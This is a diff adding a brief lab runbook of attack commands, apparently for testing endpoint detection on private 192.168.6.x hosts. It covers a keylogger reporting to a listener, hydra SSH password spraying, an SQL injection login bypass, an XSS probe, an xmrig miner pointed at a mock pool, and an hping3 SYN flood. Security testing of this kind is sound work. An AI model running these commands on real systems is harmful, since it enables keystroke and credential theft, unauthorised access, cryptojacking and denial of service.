@@ -1,0 +1,45 @@
+Keylogger
+
+(Ubuntu)
+cd keylogger
+sudo ./keylogger 192.168.6.1 12345
+
+
+(KALI)
+cd ~/keylogger
+./server
+
+Password Spraying 
+(Kali)
+cd Desktop
+hydra -L userlist.txt -P passlist.txt -u ssh://192.168.6.4 -t 4 -V
+
+
+
+SQL Injection
+(KALI)
+curl -i -X POST http://192.168.6.4:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  --data '{"email":"'\'' OR 1=1--","password":"password"}'
+
+
+XSS
+(KALI)
+curl -i -G \
+  "http://192.168.6.4:3000/rest/products/search" \
+  --data-urlencode "q=<script>alert('XSS_TEST')</script>"
+
+
+Cripto Miner
+(KALI)
+cd Desktop
+sudo python3 ./mock_pool.py
+
+(Ubuntu)
+cd ~/xmrig-6.26.0
+sudo ./xmrig -o 192.168.6.1:3333 -u edr-test-user -p x --coin monero
+
+
+syn flood
+(Kali)
+sudo hping3 -S --flood 192.168.6.4
